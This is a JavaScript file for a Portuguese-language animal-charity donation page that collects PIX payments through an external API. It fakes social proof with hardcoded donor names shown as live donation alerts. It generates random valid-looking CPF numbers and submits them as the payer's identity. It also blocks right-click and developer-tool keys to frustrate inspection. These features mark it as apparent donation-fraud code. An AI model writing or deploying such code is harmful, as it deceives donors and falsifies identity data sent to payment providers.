var loader = document.getElementById("loading");
var page = document.getElementById("content-page");
window.addEventListener("load", function () {
  loader.classList.remove("active");
  page.style.display = "block";
});

document.addEventListener("DOMContentLoaded", function () {
  const params = new URLSearchParams(window.location.search);
  const googleData = JSON.parse(localStorage.getItem("google")) || {};

  // Capturar o valor de doação da URL
  const donateValue = params.get("donate");
  if (donateValue) {
    // Converter para número e normalizar valor
    const valorNumerico = parseFloat(donateValue);

    // Adicionais - corações e saúde animal
    const valorCoracoes = 4.99;
    const valorSaudeAnimal = 3.0;
    const adicionais = valorCoracoes + valorSaudeAnimal;

    // Calcular o valor total
    const valorTotal = valorNumerico + adicionais;

    // Formatar para exibição (com vírgula)
    const valorFormatado = valorNumerico.toLocaleString("pt-BR", {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    });

    // Atualizar campo de valor
    const campoValor = document.getElementById("valor");
    if (campoValor) {
      campoValor.value = valorFormatado;
    }

    // Atualizar valores exibidos
    const doado = document.getElementById("doado");
    const total = document.getElementById("total");
    const aPagar = document.getElementById("aPagar");

    if (doado) doado.innerText = `R$ ${valorFormatado}`;

    // Formatar total
    if (total) total.innerText = formatarMoeda(valorTotal);

    // Preparar valor para o campo oculto (usar ponto como separador decimal)
    if (aPagar) aPagar.value = valorTotal.toFixed(2).replace(",", ".");

    // Atualizar também o valor no modal de order bump
    const atual = document.getElementById("atual");
    if (atual) atual.innerText = formatarMoeda(valorTotal);

    const totalDoar = document.getElementById("total-doar");
    if (totalDoar) totalDoar.innerText = formatarMoeda(valorTotal);
  }

  params.forEach((value, key) => {
    googleData[key] = value;
  });

  if (!googleData.utm_source) {
    googleData.utm_source = "organic";
  }

  localStorage.setItem("google", JSON.stringify(googleData));
  console.log("Google Data Atualizado:", googleData);

  const newParams = Object.entries(googleData)
    .map(
      ([key, value]) =>
        `${encodeURIComponent(key)}=${encodeURIComponent(value)}`
    )
    .join("&");

  const baseUrl = window.location.origin + window.location.pathname;
  const newUrl = `${baseUrl}?${newParams}`;

  if (window.location.href !== newUrl) {
    window.history.replaceState(null, "", newUrl);
  }
});

document.querySelectorAll(".show-pass").forEach((button) => {
  button.addEventListener("click", function () {
    let input = this.closest("div").querySelector("input");

    if (input.type === "password") {
      input.type = "text";
      this.innerHTML = '<i class="fa-solid fa-eye-slash"></i>';
    } else {
      input.type = "password";
      this.innerHTML = '<i class="fa-solid fa-eye"></i>';
    }
  });
});

function formatarMoeda(valor) {
  return new Intl.NumberFormat("pt-BR", {
    style: "currency",
    currency: "BRL",
  }).format(valor);
}

if (document.getElementById("barra")) {
  const arrayDados = [
    {
      nome: "Marcos Aurélio",
      image: "public/images/8.jpg.webp",
      apoiador: 1,
      doado: 50,
      coracoes: 1,
    },
    {
      nome: "Juliana Aparecida",
      image: "public/images/1.jpg.webp",
      apoiador: 1,
      doado: 32.5,
      coracoes: 0,
    },
    {
      nome: "Maria Eduarda",
      image: "public/images/7.jpg.webp",
      apoiador: 1,
      doado: 100,
      coracoes: 1,
    },
    {
      nome: "Lorena Fonseca",
      image:
        "public/images/29fde8757de0d1cde79f7271affaebf6-e1699138044607.jpg.webp",
      apoiador: 1,
      doado: 113.2,
      coracoes: 0,
    },
    {
      nome: "Lucas Fernandes",
      image: "public/images/4.jpg.webp",
      apoiador: 1,
      doado: 140.8,
      coracoes: 1,
    },
    {
      nome: "Taina Silva",
      image: "public/images/Design-sem-nome-16.jpg.webp",
      apoiador: 1,
      doado: 100,
      coracoes: 1,
    },
    {
      nome: "Fernanda Oliveira",
      image: "public/images/14.jpg.webp",
      apoiador: 1,
      doado: 210,
      coracoes: 0,
    },
    {
      nome: "Marcos Paulo",
      image:
        "public/images/1b983d2e625fdae0231621bf79757043-e1699138160887.jpg.webp",
      apoiador: 1,
      doado: 55,
      coracoes: 1,
    },
    {
      nome: "João Castro",
      image: "public/images/741c4f79b472f094b436fb5887129b84-1.jpg.webp",
      apoiador: 1,
      doado: 62,
      coracoes: 0,
    },
    {
      nome: "Julio César",
      image: "public/images/8.jpg.webp",
      apoiador: 1,
      doado: 108,
      coracoes: 1,
    },
    {
      nome: "Marcela de Moraes",
      image: "public/images/1.jpg.webp",
      apoiador: 1,
      doado: 60,
      coracoes: 0,
    },
    {
      nome: "Roberta de Souza",
      image: "public/images/7.jpg.webp",
      apoiador: 1,
      doado: 150,
      coracoes: 1,
    },
    {
      nome: "Raquel Oliveira",
      image:
        "public/images/29fde8757de0d1cde79f7271affaebf6-e1699138044607.jpg.webp",
      apoiador: 1,
      doado: 256,
      coracoes: 0,
    },
    {
      nome: "Marcelo Rodrigues",
      image: "public/images/4.jpg.webp",
      apoiador: 1,
      doado: 155,
      coracoes: 1,
    },
    {
      nome: "Taís Costa",
      image: "public/images/Design-sem-nome-16.jpg.webp",
      apoiador: 1,
      doado: 144,
      coracoes: 1,
    },
    {
      nome: "Manuela Ribeiro",
      image: "public/images/14.jpg.webp",
      apoiador: 1,
      doado: 105,
      coracoes: 0,
    },
    {
      nome: "Eduardo dos Santos",
      image:
        "public/images/1b983d2e625fdae0231621bf79757043-e1699138160887.jpg.webp",
      apoiador: 1,
      doado: 40.5,
      coracoes: 1,
    },
    {
      nome: "Manoel Caetano Santos",
      image: "public/images/741c4f79b472f094b436fb5887129b84-1.jpg.webp",
      apoiador: 1,
      doado: 32,
      coracoes: 0,
    },
  ];

  let index = 0;

  function atualizarValores() {
    if (index >= arrayDados.length) return;

    let item = arrayDados[index];
    apoiadores += item.apoiador;
    coracoes += item.coracoes;
    animarValor("apoiadores", apoiadores);
    animarValor("coracoes", coracoes);

    let novoValor = arrecadado + item.doado;
    animarValor("doado", novoValor, arrecadado);
    arrecadado = novoValor;

    exibirNotificacao(item.nome, item.image, item.doado);
    atualizarBarra();
    index++;
  }

  function atualizarBarra() {
    let porcentagem = (arrecadado / meta) * 100;
    let porcento = Math.round(porcentagem);
    document.getElementById("barra").style.width = porcentagem + "%";
    document.getElementById("barraMobile").style.width = porcentagem + "%";
    document.getElementById("porcentagem").innerHTML = porcento + "%";
  }

  function animarValor(id, novoValor, valorAntigo = 0) {
    let elementos = document.querySelectorAll(`#${id}, #valorMobile`);
    let inicio =
      valorAntigo ||
      parseFloat(elementos[0].innerText.replace(/[^0-9.,]/g, "")) ||
      0;
    let incremento = (novoValor - inicio) / 50;
    let atual = inicio;
    let contador = 0;

    let animacao = setInterval(() => {
      atual += incremento;
      elementos.forEach((elemento) => {
        elemento.innerText =
          id === "doado" ? formatarMoeda(atual) : atual.toFixed(0);
      });

      contador++;
      if (contador >= 50) {
        clearInterval(animacao);
        elementos.forEach((elemento) => {
          elemento.innerText =
            id === "doado" ? formatarMoeda(novoValor) : novoValor;
        });
      }
    }, 20);
  }

  function exibirNotificacao(nome, image, valor) {
    let notificacao = document.createElement("div");
    notificacao.className = "notificacao";
    notificacao.innerHTML = `<div class="avatar"><img src="${image}" alt="${nome}"></div><div class="content"><h4>${nome}</h4> Acabou de doar <strong>${formatarMoeda(
      valor
    )}</strong>.</div>`;

    document.body.appendChild(notificacao);

    setTimeout(() => {
      let rect = notificacao.getBoundingClientRect();

      confetti({
        particleCount: 100,
        spread: 70,
        origin: {
          x: (rect.left + rect.width / 2) / window.innerWidth,
          y: (rect.top + rect.height / 2) / window.innerHeight,
        },
      });
    }, 100);

    setTimeout(() => {
      notificacao.style.transform = "translatey(0)";
      notificacao.style.opacity = "0";
      setTimeout(() => notificacao.remove(), 500);
    }, 6000);
  }

  setInterval(atualizarValores, 30000);

  document.addEventListener("DOMContentLoaded", () => {
    atualizarBarra();
  });

  document.addEventListener("DOMContentLoaded", () => {
    let script = document.createElement("script");
    script.src =
      "https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js";
    document.head.appendChild(script);
  });

  jQuery(function ($) {
    $(document).ready(function () {
      $('a[href^="#"]').on("click", function (e) {
        e.preventDefault();
        var id = $(this).attr("href"),
          targetOffset = $(id).offset().top;

        $("html, body").animate(
          {
            scrollTop: targetOffset - 60,
          },
          1000
        );
      });

      $(".menu-mobile, .close-menu").click(function () {
        $(".nav-mobile").toggleClass("active");
      });
    });

    $(".btn-ajudar, .fora-modal, .close-modal").click(function () {
      $(".modal-doar").toggleClass("open");
    });
  });
}

jQuery(function ($) {
  $(document).ready(function () {
    $("#form-login").on("submit", function (event) {
      event.preventDefault();

      var formData = new FormData($(this)[0]);
      var action = $(this).attr("action");

      $.ajax({
        type: "POST",
        url: action,
        data: formData,
        processData: false,
        contentType: false,
        success: function (response) {
          if (response.success) {
            window.location.href = response.redirect;
          } else {
            $(".alert-login").css("display", "block");
          }
        },
        beforeSend: function () {
          $("#loading-form").css({ display: "flex" });
          $(".alert-login").css("display", "none");
        },
        complete: function () {
          $("#loading-form").css({ display: "none" });
        },
      });
    });

    $(".bt-logout").on("click", function (event) {
      event.preventDefault();
      $("#logout-form").submit();
    });

    $(".input_money").maskMoney({
      prefix: "",
      allowNegative: false,
      thousands: ".",
      decimal: ",",
      affixesStay: false,
      precision: 2,
    });

    $("#valor").on("blur", function () {
      var contribuicao = $(this).val();
      var valor = parseFloat($(this).maskMoney("unmasked")[0]);
      var min = 30.0;
      var max = 10000.0;
      var aviso = "";

      if (valor != "" && valor < min) {
        aviso = "Valor da contribuição deve ser no mínimo R$ 30,00";
      } else if (valor != "" && valor > max) {
        aviso = "Valor da contribuição deve ser no máximo R$ 10.000,00";
      }

      if (aviso !== "") {
        $(".aviso_valor").html(aviso);
        $(".aviso_valor").css("display", "block");
        $(this).addClass("error");
        $("#doado").text("R$ 0,00");
        donate = 0.0;
        total = formatarMoeda(donate);
        $("#total").text(total);
        $("#aPagar").val(donate);
      } else {
        $(".aviso_valor").css("display", "none");
        $(this).removeClass("error");
        if (contribuicao == "") {
          $("#doado").text("R$ 0,00");
        } else {
          $("#doado").text("R$ " + contribuicao);
        }
        donate = valor;
        total = formatarMoeda(donate);
        $("#total").text(total);
        $("#aPagar").val(donate);
      }
    });

    $("#celular, #telefone").focus(function () {
      $(this).mask("(99) 99999-9999");
    });
    $("#celular, #telefone")
      .mask("(99) 99999-9999")
      .focusout(function (event) {
        var target, phone, element;
        target = event.currentTarget ? event.currentTarget : event.srcElement;
        phone = target.value.replace(/\D/g, "");
        element = $(target);
        element.unmask();
        if (phone.length > 10) {
          element.mask("(99) 99999-9999");
        } else {
          element.mask("(99) 9999-9999");
        }
      });

    $("#formDoacao").on("submit", function (event) {
      event.preventDefault();

      const googleData = JSON.parse(localStorage.getItem("google")) || {};

      var formData = new FormData($(this)[0]);
      var action = $(this).attr("action");

      for (const key in googleData) {
        if (googleData.hasOwnProperty(key)) {
          if (!formData.has(key)) {
            formData.append(key, googleData[key]);
          }
        }
      }

      const newParams = Object.entries(googleData)
        .map(
          ([key, value]) =>
            `${encodeURIComponent(key)}=${encodeURIComponent(value)}`
        )
        .join("&");

      formData.append("parametros", newParams);

      $.ajax({
        type: "POST",
        url: action,
        data: formData,
        processData: false,
        contentType: false,
        success: function (response) {
          if (response.success) {
            window.location.href = response.redirect;
          }
        },
        beforeSend: function () {
          $("#loading-form").css({ display: "flex" });
        },
        complete: function () {
          $("#loading-form").css({ display: "none" });
        },
      });
    });

    // Inicializa o valor de doação global
    let donate = 0;

    // Se o checkbox de turbinar estiver marcado, adiciona handlers para ele
    $("#turbinar").change(function () {
      if ($(this).is(":checked")) {
        $(".turbinado").removeClass("d-none");
        donate = parseFloat($("#aPagar").val() || 0);
        var newValor = donate + 7.99;
        donate = newValor;
        total = formatarMoeda(donate);
        $("#total").text(total);
        $("#atual").text(total);
        $("#aPagar").val(donate.toFixed(2));
        $("#total-doar").text(total);
      } else {
        $(".turbinado").addClass("d-none");
        donate = parseFloat($("#aPagar").val() || 0);
        var newValor = donate - 7.99;
        donate = newValor;
        total = formatarMoeda(donate);
        $("#total").text(total);
        $("#atual").text(total);
        $("#aPagar").val(donate.toFixed(2));
        $("#total-doar").text(total);
      }
    });

    // Handler para o checkbox de ração
    $("#racao").on("change", function () {
      var racao = parseFloat($(this).val());
      donate = parseFloat($("#aPagar").val() || 0);

      if ($(this).is(":checked")) {
        $("#label-racao").html("Remover");
        $("#label-racao").addClass("remove");
        var newValor = donate + racao;
        donate = newValor;
        total = formatarMoeda(donate);
        $("#total").text(total);
        $("#aPagar").val(donate.toFixed(2));
        $("#total-doar").text(total);
      } else {
        $("#label-racao").html(
          "Doe também <small>(+" + formatarMoeda(racao) + ")</small>"
        );
        $("#label-racao").removeClass("remove");
        var newValor = donate - racao;
        donate = newValor;
        total = formatarMoeda(donate);
        $("#total").text(total);
        $("#aPagar").val(donate.toFixed(2));
        $("#total-doar").text(total);
      }
    });

    // Handler para o checkbox de remédios
    $("#remedios").on("change", function () {
      var remedio = parseFloat($(this).val());
      donate = parseFloat($("#aPagar").val() || 0);

      if ($(this).is(":checked")) {
        $("#label-remedio").html("Remover");
        $("#label-remedio").addClass("remove");
        var newValor = donate + remedio;
        donate = newValor;
        total = formatarMoeda(donate);
        $("#total").text(total);
        $("#aPagar").val(donate.toFixed(2));
        $("#total-doar").text(total);
      } else {
        $("#label-remedio").html(
          "Doe também <small>(+" + formatarMoeda(remedio) + ")</small>"
        );
        $("#label-remedio").removeClass("remove");
        var newValor = donate - remedio;
        donate = newValor;
        total = formatarMoeda(donate);
        $("#total").text(total);
        $("#aPagar").val(donate.toFixed(2));
        $("#total-doar").text(total);
      }
    });

    // Handler para o botão que abre o modal de orderbump
    $("#open-modal-bum").on("click", function (event) {
      event.preventDefault();
      var telefone = $("#telefone").val();
      var email = $("#email").val();
      var nome = $("#nome").val();

      if (!telefone || !email || !nome) {
        window.scrollTo({ top: 0, behavior: "smooth" });

        setTimeout(() => {
          if (!telefone) {
            document.getElementById("telefone").focus();
          } else if (!email) {
            document.getElementById("email").focus();
          } else if (!nome) {
            document.getElementById("nome").focus();
          }
        }, 500);
      } else {
        $(".modal-orderbump").addClass("active");
      }
    });

    // Função para gerar um CPF válido
    function gerarCPFValido() {
      // Gera 9 dígitos aleatórios
      let cpf = "";
      for (let i = 0; i < 9; i++) {
        cpf += Math.floor(Math.random() * 10).toString();
      }

      // Calcula o primeiro dígito verificador
      let soma = 0;
      for (let i = 0; i < 9; i++) {
        soma += parseInt(cpf.charAt(i)) * (10 - i);
      }
      let resto = 11 - (soma % 11);
      let dv1 = resto > 9 ? 0 : resto;

      // Adiciona o primeiro dígito verificador
      cpf += dv1;

      // Calcula o segundo dígito verificador
      soma = 0;
      for (let i = 0; i < 10; i++) {
        soma += parseInt(cpf.charAt(i)) * (11 - i);
      }
      resto = 11 - (soma % 11);
      let dv2 = resto > 9 ? 0 : resto;

      // Adiciona o segundo dígito verificador
      cpf += dv2;

      // Log para debug
      console.log(`CPF gerado: ${cpf}`);

      // Retorna o CPF formatado
      return cpf;
    }

    // Função para verificar se um CPF é válido (útil para testes)
    function validarCPF(cpf) {
      // Remove caracteres não numéricos
      cpf = cpf.replace(/\D/g, "");

      // Verifica se tem 11 dígitos
      if (cpf.length !== 11) return false;

      // Verifica se todos os dígitos são iguais (CPF inválido, mas passa na validação matemática)
      if (/^(\d)\1+$/.test(cpf)) return false;

      // Valida o primeiro dígito verificador
      let soma = 0;
      for (let i = 0; i < 9; i++) {
        soma += parseInt(cpf.charAt(i)) * (10 - i);
      }
      let resto = 11 - (soma % 11);
      let dv1 = resto > 9 ? 0 : resto;
      if (dv1 != cpf.charAt(9)) return false;

      // Valida o segundo dígito verificador
      soma = 0;
      for (let i = 0; i < 10; i++) {
        soma += parseInt(cpf.charAt(i)) * (11 - i);
      }
      resto = 11 - (soma % 11);
      let dv2 = resto > 9 ? 0 : resto;
      if (dv2 != cpf.charAt(10)) return false;

      return true;
    }

    // Handler para o botão de submit no modal
    $("#submitModal").on("click", function () {
      // Obter valores do formulário
      const nome = $("#nome").val();
      const email = $("#email").val();
      const telefone = $("#telefone").val().replace(/\D/g, "");
      const valorTotal = parseFloat($("#aPagar").val() || 0);
      const valorCentavos = Math.round(valorTotal * 100); // Converter para centavos conforme a API requer

      // Gerar CPF válido automaticamente
      const cpfValido = gerarCPFValido();

      // Verificar se o CPF é válido
      if (!validarCPF(cpfValido)) {
        console.error("CPF gerado é inválido! Gerando novo CPF...");
        // Tentar novamente
        const novoTentativaCPF = gerarCPFValido();
        if (!validarCPF(novoTentativaCPF)) {
          console.error("Falha ao gerar CPF válido após duas tentativas.");
          alert(
            "Ocorreu um erro ao processar a solicitação. Por favor, tente novamente."
          );
          return;
        }
      }

      // Formatar CPF para exibição no console (apenas para debug)
      const cpfFormatado = cpfValido.replace(
        /(\d{3})(\d{3})(\d{3})(\d{2})/,
        "$1.$2.$3-$4"
      );
      console.log(
        `CPF formatado: ${cpfFormatado} (validação: ${
          validarCPF(cpfValido) ? "válido" : "inválido"
        })`
      );

      // Obter UTM params
      const googleData = JSON.parse(localStorage.getItem("google")) || {};
      const utmParams = googleData.utm_source
        ? `${googleData.utm_source}${
            googleData.utm_campaign ? `|${googleData.utm_campaign}` : ""
          }`
        : "organic";

      // Preparar os dados para a API PIX
      const pixData = {
        amount: valorCentavos,
        description: "Doação para Fundação Quatro Patas",
        customer: {
          name: nome,
          document: cpfValido, // CPF válido gerado automaticamente
          phone: telefone,
          email: email,
        },
        item: {
          title: "Doação - Fundação Quatro Patas",
          price: valorCentavos,
          quantity: 1,
        },
        utm: utmParams,
      };

      // Log detalhado para debug
      console.group("Dados da requisição PIX");
      console.log("Valor total:", valorTotal);
      console.log("Valor em centavos:", valorCentavos);
      console.log("Nome:", nome);
      console.log("Email:", email);
      console.log("Telefone:", telefone);
      console.log("CPF:", cpfFormatado);
      console.log("UTM:", utmParams);
      console.log("Dados completos:", pixData);
      console.groupEnd();

      // Mostrar loading
      $("#loading-form").css({ display: "flex" });

      // Fazer requisição para a API
      $.ajax({
        type: "POST",
        url: "https://api-production-0feb.up.railway.app/g5",
        data: JSON.stringify(pixData),
        contentType: "application/json",
        success: function (response) {
          // Ocultar loading
          $("#loading-form").css({ display: "none" });

          // Log detalhado da resposta
          console.group("Resposta da API PIX");
          console.log("Status: Sucesso");
          console.log("Código PIX:", response.pixCode);
          console.log("ID da transação:", response.transactionId);
          console.log("Resposta completa:", response);
          console.groupEnd();

          // Mostrar modal com o código PIX
          mostrarModalPix(response.pixCode, response.transactionId);

          // Iniciar verificação de pagamento
          verificarStatusPagamento(response.transactionId);
        },
        error: function (error) {
          // Log detalhado do erro
          console.group("Erro na API PIX");
          console.error("Status:", error.status);
          console.error("Mensagem:", error.statusText);
          console.error("Resposta:", error.responseText);
          console.error("Erro completo:", error);
          console.groupEnd();

          alert(
            "Ocorreu um erro ao gerar o código PIX. Por favor, tente novamente."
          );
          $("#loading-form").css({ display: "none" });
        },
      });
    });

    // Função para mostrar o modal com o código PIX
    function mostrarModalPix(pixCode, transactionId) {
      // Criar modal na página se ainda não existir
      if (!document.getElementById("modal-pix")) {
        const modalHtml = `
        <div id="modal-pix" class="modal modal-pix">
          <div class="content-modal content-pix">
            <h2>Efetue o pagamento via PIX</h2>
            <div class="pix-instructions-container">
              <h3>Como pagar:</h3>
              <ol class="pix-steps">
                <li>Abra o app do seu banco</li>
                <li>Selecione a opção "Pagar com PIX"</li>
                <li>Escolha a opção "Pix Copia e Cola"</li>
                <li>Cole o código abaixo e confirme o pagamento</li>
              </ol>
            </div>
            <div class="pix-code-container">
              <label for="pix-code">Copie o código PIX abaixo:</label>
              <textarea id="pix-code" readonly></textarea>
              <button id="copy-pix" class="btn-copy">Copiar</button>
            </div>
            <div class="pix-status" id="pix-status">
              <p>Aguardando pagamento...</p>
              <div class="loader"></div>
            </div>
            <div class="pix-timer">
              <p>Tempo estimado para confirmação: <span id="pix-timer">60</span> segundos</p>
            </div>
            <p class="pix-disclaimer">Não feche esta página até a confirmação do pagamento</p>
            <input type="hidden" id="transaction-id" value="">
          </div>
        </div>`;

        $("body").append(modalHtml);

        // Adicionar CSS inline para o modal
        const style = document.createElement("style");
        style.textContent = `
          .modal-pix { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.8); }
          .modal-pix.active { display: block; animation: fadeIn 0.3s; }
          .content-pix { background-color: #fff; margin: 5% auto; padding: 30px; border-radius: 15px; width: 90%; max-width: 500px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.2); animation: slideUp 0.4s; }
          .content-pix h2 { color: #333; margin-bottom: 30px; font-size: 24px; }
          .pix-instructions-container { text-align: left; margin-bottom: 25px; }
          .pix-instructions-container h3 { font-size: 18px; margin-bottom: 15px; color: #333; text-align: center; }
          .pix-steps { padding-left: 30px; font-size: 16px; line-height: 1.8; color: #555; }
          .pix-steps li { margin-bottom: 12px; }
          .pix-code-container { margin: 30px 0; position: relative; background: #f9f9f9; padding: 20px; border-radius: 8px; border: 1px dashed #ddd; }
          #pix-code { width: 100%; height: 80px; padding: 12px; font-size: 14px; resize: none; border: 1px solid #ddd; border-radius: 5px; margin-top: 10px; background-color: #f5f5f5; }
          .pix-code-container label { display: block; text-align: center; margin-bottom: 10px; font-size: 16px; color: #333; font-weight: bold; }
          .btn-copy { background: #28a745; color: white; border: none; padding: 8px 20px; border-radius: 4px; cursor: pointer; position: absolute; right: 30px; bottom: 30px; font-size: 16px; transition: all 0.2s; }
          .btn-copy:hover { background: #218838; transform: translateY(-2px); }
          .pix-status { margin: 25px 0; padding: 15px; border-radius: 8px; background-color: #f0f8ff; }
          .loader { border: 4px solid #f3f3f3; border-radius: 50%; border-top: 4px solid #3498db; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
          .pix-timer { font-size: 14px; color: #666; margin-bottom: 15px; }
          .pix-disclaimer { font-size: 14px; color: #dc3545; font-weight: bold; }
          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
          @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
          @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        `;
        document.head.appendChild(style);

        // Adicionar handler para copiar o código PIX
        $(document).on("click", "#copy-pix", function () {
          const pixCode = document.getElementById("pix-code");
          pixCode.select();
          document.execCommand("copy");
          $(this).text("Copiado!");
          $(this).css("background-color", "#218838");
          setTimeout(() => {
            $(this).text("Copiar");
            $(this).css("background-color", "#28a745");
          }, 2000);
        });
      }

      // Atualizar o conteúdo do modal e exibi-lo
      $("#pix-code").val(pixCode);
      $("#transaction-id").val(transactionId);
      $("#pix-status").html(
        '<p>Aguardando pagamento...</p><div class="loader"></div>'
      );
      $("#modal-pix").addClass("active");

      // Iniciar timer visual
      let countdown = 60;
      const timer = setInterval(() => {
        countdown--;
        $("#pix-timer").text(countdown);
        if (countdown <= 0) {
          clearInterval(timer);
          $("#pix-timer").text("Verificando...");
        }
      }, 1000);
    }

    // Função para verificar o status do pagamento
    function verificarStatusPagamento(transactionId) {
      console.log(`Iniciando verificação do pagamento: ${transactionId}`);

      let verificacoes = 0;
      const maxVerificacoes = 60; // 10 minutos (verificação a cada 10 segundos)

      const checkPayment = setInterval(function () {
        verificacoes++;

        // Atualizar status no modal
        if (verificacoes > 1) {
          $("#pix-status").html(`
            <p>Verificando pagamento... <span class="attempt">(${verificacoes}/${maxVerificacoes})</span></p>
            <div class="loader"></div>
          `);
        }

        console.log(
          `Verificação #${verificacoes} para transação: ${transactionId}`
        );

        $.ajax({
          type: "POST",
          url: "https://api-production-0feb.up.railway.app/verify5",
          data: JSON.stringify({ paymentId: transactionId }),
          contentType: "application/json",
          success: function (response) {
            console.group(`Resposta da verificação #${verificacoes}`);
            console.log("Status:", response.status);
            console.log("Resposta completa:", response);
            console.groupEnd();

            if (response.status === "completed") {
              // Pagamento confirmado
              clearInterval(checkPayment);
              console.log("Pagamento confirmado com sucesso!");
              $("#pix-status").html(`
                <div class="payment-success">
                  <div class="success-icon">
                    <svg viewBox="0 0 24 24" width="40" height="40">
                      <path fill="#28a745" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
                    </svg>
                  </div>
                  <p>Pagamento confirmado com sucesso!</p>
                </div>
              `);

              // Adicionar CSS para o sucesso
              const successStyle = document.createElement("style");
              successStyle.textContent = `
                .payment-success { padding: 15px; background-color: #d4edda; border-radius: 8px; }
                .success-icon { margin: 0 auto 10px; width: 50px; height: 50px; background: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
                .payment-success p { color: #155724; font-weight: bold; margin: 0; }
              `;
              document.head.appendChild(successStyle);

              // Mostrar mensagem de redirecionamento
              setTimeout(() => {
                $("#pix-status").append(
                  '<p style="margin-top: 10px; font-size: 14px;">Redirecionando para a página de confirmação...</p>'
                );
              }, 1000);

              // Redirecionar para página de agradecimento após 3 segundos
              setTimeout(() => {
                window.location.href = "./agradecimento.html";
              }, 3000);
            } else if (response.status === "pending") {
              // Ainda aguardando pagamento, continua verificando
              console.log(
                `Pagamento ainda pendente. Verificação ${verificacoes}/${maxVerificacoes}`
              );

              if (verificacoes >= maxVerificacoes) {
                clearInterval(checkPayment);
                console.log("Tempo de verificação excedido.");

                $("#pix-status").html(`
                  <div class="payment-timeout">
                    <p>Tempo de verificação excedido</p>
                    <p class="timeout-desc">O pagamento pode levar mais tempo para ser processado. Se você já pagou, fique tranquilo(a), seu pagamento será processado automaticamente.</p>
                    <button id="retry-verification" class="retry-btn">Tentar verificar novamente</button>
                  </div>
                `);

                // Adicionar handler para o botão de tentar novamente
                $("#retry-verification").on("click", function () {
                  verificacoes = 0;
                  $("#pix-status").html(
                    '<p>Verificando pagamento...</p><div class="loader"></div>'
                  );
                  verificarStatusPagamento(transactionId);
                });
              }
            } else if (
              response.status === "cancelled" ||
              response.status === "expired"
            ) {
              // Pagamento cancelado ou expirado
              clearInterval(checkPayment);
              console.log(`Pagamento ${response.status}.`);

              $("#pix-status").html(`
                <div class="payment-error">
                  <p>O pagamento foi ${
                    response.status === "cancelled" ? "cancelado" : "expirado"
                  }.</p>
                  <button id="generate-new-pix" class="retry-btn">Gerar novo código PIX</button>
                </div>
              `);

              // Adicionar CSS para erro
              const errorStyle = document.createElement("style");
              errorStyle.textContent = `
                .payment-error { padding: 15px; background-color: #f8d7da; border-radius: 8px; }
                .payment-error p { color: #721c24; margin: 0 0 10px 0; }
                .retry-btn { background: #007bff; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; margin-top: 10px; }
                .payment-timeout { padding: 15px; background-color: #fff3cd; border-radius: 8px; }
                .payment-timeout p { color: #856404; margin: 0; }
                .timeout-desc { font-size: 13px; margin-top: 10px !important; color: #666 !important; }
              `;
              document.head.appendChild(errorStyle);

              // Adicionar handler para gerar novo PIX
              $("#generate-new-pix").on("click", function () {
                // Fechar o modal atual
                $("#modal-pix").removeClass("active");
                // Chamar o botão de submit para reenviar o formulário
                $("#submitModal").trigger("click");
              });
            }
          },
          error: function (error) {
            console.group(`Erro na verificação #${verificacoes}`);
            console.error("Status:", error.status);
            console.error("Mensagem:", error.statusText);
            console.error("Resposta:", error.responseText);
            console.error("Erro completo:", error);
            console.groupEnd();

            // Se ocorrer muitos erros de verificação, mostrar mensagem
            if (verificacoes >= 5) {
              $("#pix-status").html(`
                <div class="payment-error">
                  <p>Estamos enfrentando problemas para verificar seu pagamento.</p>
                  <p class="timeout-desc">Se você já realizou o pagamento, fique tranquilo. Seu pagamento será processado e registrado em nosso sistema.</p>
                  <button id="retry-verification" class="retry-btn">Tentar verificar novamente</button>
                </div>
              `);

              // Adicionar handler para o botão de tentar novamente
              $("#retry-verification").on("click", function () {
                verificacoes = 0;
                $("#pix-status").html(
                  '<p>Verificando pagamento...</p><div class="loader"></div>'
                );
                verificarStatusPagamento(transactionId);
              });
            }
          },
        });
      }, 10000); // Verificar a cada 10 segundos conforme a documentação

      // Parar de verificar após o número máximo de tentativas
      setTimeout(() => {
        clearInterval(checkPayment);
        if ($("#modal-pix").hasClass("active")) {
          console.log(
            "Tempo máximo de verificação excedido. Finalizando verificações."
          );

          $("#pix-status").html(`
            <div class="payment-timeout">
              <p>Tempo de verificação excedido</p>
              <p class="timeout-desc">O tempo máximo para verificação do pagamento foi excedido. Se você realizou o pagamento, ele será processado normalmente.</p>
              <button id="go-to-thanks" class="retry-btn">Ir para página de confirmação</button>
            </div>
          `);

          // Adicionar handler para o botão
          $("#go-to-thanks").on("click", function () {
            window.location.href = "./agradecimento.html";
          });
        }
      }, maxVerificacoes * 10000 + 5000);
    }
  });
});

document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
  triggerDebugger();
});

document.addEventListener("keydown", function (e) {
  const key = e.key.toLowerCase();

  if (
    key === "f12" ||
    (e.ctrlKey && e.shiftKey && (key === "i" || key === "c")) ||
    (e.ctrlKey && key === "u") ||
    (e.ctrlKey && e.shiftKey && (key === "j" || key === "k")) ||
    key === "f11" ||
    (e.metaKey && key === "i")
  ) {
    e.preventDefault();
    triggerDebugger();
  }
});
